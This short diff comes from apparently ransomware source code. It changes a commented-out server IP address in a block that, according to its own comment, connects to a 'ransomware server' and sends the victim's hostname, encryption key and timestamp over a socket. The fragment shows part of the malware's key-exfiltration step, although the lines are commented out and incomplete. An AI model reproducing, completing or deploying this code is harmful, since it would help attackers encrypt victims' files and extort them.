@@ -64,7 +64,7 @@ for i in range(encryption_level):
 hostname = os.getenv('COMPUTERNAME')
 
 # Connect to the ransomware server and send hostname and key (Uncomment the next six lines connect to ransomware server, and send the hostname, key, and data and time of the victim)
-# ip_address = '192.168.1.251'
+# ip_address = '192.168.1.1'
 # port = 5678
 # time = datetime.now()
 # with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
